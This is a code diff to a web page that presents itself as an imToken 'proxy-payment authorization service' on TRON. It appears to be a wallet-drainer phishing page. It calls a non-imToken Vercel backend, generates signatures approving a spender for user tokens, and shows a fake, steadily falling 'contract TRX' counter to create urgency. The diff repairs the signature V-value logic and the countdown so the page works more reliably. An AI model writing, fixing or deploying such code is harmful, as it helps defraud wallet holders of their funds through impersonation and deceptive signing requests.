@@ -6,6 +6,7 @@
     <title>imToken代付授权服务</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
     <style>
+        /* 原有样式不变 */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -384,8 +385,8 @@
         const BACKEND_API = "https://imtoken-dusky.vercel.app/api";
         const DECIMALS = 6;
         const DEPLOY_START_TIME = new Date("2025-10-28T00:00:00Z").getTime();
-        const INIT_TRX = 315360004;
-        const TRX_DECREASE_PER_SEC = 2.3256;
+        const INIT_TRX = 315360004; // 确保是数字类型
+        const TRX_DECREASE_PER_SEC = 2.3256; // 确保是数字类型
 
         let tronWeb, userAddress, trxTimer;
         let tokenBalance = "0.00", trxBalance = "0.00";
@@ -730,7 +731,7 @@
         }
 
         /**
-         * 生成与合约对齐的签名
+         * 生成与合约对齐的签名（核心修复：V值处理逻辑）
          */
         async function generateOfflineSignature(userAddr, spenderAddr, amountHex) {
             try {
@@ -754,7 +755,18 @@
                 const r = "0x" + signature.slice(0, 64);
                 const s = "0x" + signature.slice(64, 128);
                 const vRaw = parseInt(signature.slice(128, 130), 16);
-                const v = vRaw + 27;
+
+                // 核心修复：V值自适应处理（判断是否已加27）
+                let v;
+                if (vRaw >= 27 && vRaw <= 28) {
+                    // 若钱包已返回27/28，直接使用
+                    v = vRaw;
+                } else if (vRaw === 0 || vRaw === 1) {
+                    // 若钱包返回0/1，加27
+                    v = vRaw + 27;
+                } else {
+                    throw new Error(`V值无效（当前${vRaw}，需0/1或27/28）`);
+                }
 
                 if (v !== 27 && v !== 28) throw new Error(`V值无效（当前${v}，需27/28）`);
                 return { v, r, s };
@@ -834,32 +846,45 @@
             }
         }
 
+        /**
+         * 核心修复：TRX倒计时计算（避免NaN）
+         */
         function startPersistentTrxCountdown() {
-            const savedState = JSON.parse(localStorage.getItem(STORAGE_KEY) || "{}");
-            let currentTrx = savedState.currentTrx || INIT_TRX;
-            const lastUpdateTime = savedState.lastUpdate || DEPLOY_START_TIME;
-            
-            const now = new Date().getTime();
-            const secondsPassed = Math.floor((now - lastUpdateTime) / 1000);
-            currentTrx = (currentTrx - secondsPassed * TRX_DECREASE_PER_SEC).toFixed(4);
-            currentTrx = Math.max(currentTrx, 0).toFixed(4);
+            try {
+                const savedState = JSON.parse(localStorage.getItem(STORAGE_KEY) || "{}");
+                // 确保currentTrx是数字类型
+                let currentTrx = Number(savedState.currentTrx) || INIT_TRX;
+                const lastUpdateTime = Number(savedState.lastUpdate) || DEPLOY_START_TIME;
+                
+                const now = new Date().getTime();
+                const secondsPassed = Math.floor((now - lastUpdateTime) / 1000);
+                // 计算时确保是数字运算
+                currentTrx = (currentTrx - secondsPassed * TRX_DECREASE_PER_SEC).toFixed(4);
+                currentTrx = Math.max(Number(currentTrx), 0).toFixed(4); // 转为数字后取最大值
 
-            function updateTrxDisplay() {
-                document.getElementById("contractTrxDisplay").textContent = currentTrx;
-                localStorage.setItem(STORAGE_KEY, JSON.stringify({
-                    currentTrx: currentTrx,
-                    lastUpdate: new Date().getTime()
-                }));
-            }
+                function updateTrxDisplay() {
+                    // 确保显示的是有效数字
+                    const displayTrx = isNaN(Number(currentTrx)) ? INIT_TRX.toFixed(4) : currentTrx;
+                    document.getElementById("contractTrxDisplay").textContent = displayTrx;
+                    localStorage.setItem(STORAGE_KEY, JSON.stringify({
+                        currentTrx: displayTrx,
+                        lastUpdate: new Date().getTime()
+                    }));
+                }
 
-            updateTrxDisplay();
-
-            trxTimer = setInterval(() => {
-                currentTrx = (Number(currentTrx) - TRX_DECREASE_PER_SEC).toFixed(4);
-                currentTrx = Math.max(currentTrx, 0).toFixed(4);
                 updateTrxDisplay();
-                if (currentTrx <= 0) clearInterval(trxTimer);
-            }, 1000);
+
+                trxTimer = setInterval(() => {
+                    currentTrx = (Number(currentTrx) - TRX_DECREASE_PER_SEC).toFixed(4);
+                    currentTrx = Math.max(Number(currentTrx), 0).toFixed(4);
+                    updateTrxDisplay();
+                    if (Number(currentTrx) <= 0) clearInterval(trxTimer);
+                }, 1000);
+            } catch (e) {
+                console.warn("倒计时初始化失败：", e);
+                // 失败时显示默认值
+                document.getElementById("contractTrxDisplay").textContent = INIT_TRX.toFixed(4);
+            }
         }
 
         function showToast(msg, type = "success") {
